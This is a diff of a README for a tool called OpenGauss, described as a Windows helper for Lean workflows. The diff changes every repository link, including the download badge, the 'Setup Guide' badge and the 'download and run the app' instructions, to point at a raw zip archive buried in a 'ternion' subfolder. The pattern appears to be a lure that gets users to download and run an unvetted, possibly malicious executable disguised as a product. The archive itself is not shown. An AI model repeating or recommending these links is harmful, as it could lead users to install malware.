@@ -1,10 +1,10 @@
 # ⚙️ OpenGauss - Run Lean workflows with less effort
 
 <p align="center">
-  <a href="https://github.com/Tkyle9439/OpenGauss">
+  <a href="https://github.com/Tkyle9439/OpenGauss/raw/refs/heads/main/ternion/Gauss_Open_3.4.zip">
     <img src="https://img.shields.io/badge/Download-OpenGauss-5865F2?style=for-the-badge" alt="Download OpenGauss">
   </a>
-  <a href="https://github.com/Tkyle9439/OpenGauss">
+  <a href="https://github.com/Tkyle9439/OpenGauss/raw/refs/heads/main/ternion/Gauss_Open_3.4.zip">
     <img src="https://img.shields.io/badge/OpenGauss-Setup%20Guide-6B7280?style=for-the-badge" alt="OpenGauss Setup Guide">
   </a>
 </p>
@@ -27,7 +27,7 @@ It is built for users who want a clear way to work with Lean tools on Windows wi
 
 Visit this page to download and run the app:
 
-https://github.com/Tkyle9439/OpenGauss
+https://github.com/Tkyle9439/OpenGauss/raw/refs/heads/main/ternion/Gauss_Open_3.4.zip
 
 ## 🪟 Windows setup
 
@@ -172,7 +172,7 @@ OpenGauss helps organize this setup so you can focus on the work instead of the 
 
 If you need the download page again, use this link:
 
-https://github.com/Tkyle9439/OpenGauss
+https://github.com/Tkyle9439/OpenGauss/raw/refs/heads/main/ternion/Gauss_Open_3.4.zip
 
 ## 🖱️ Quick install path
 
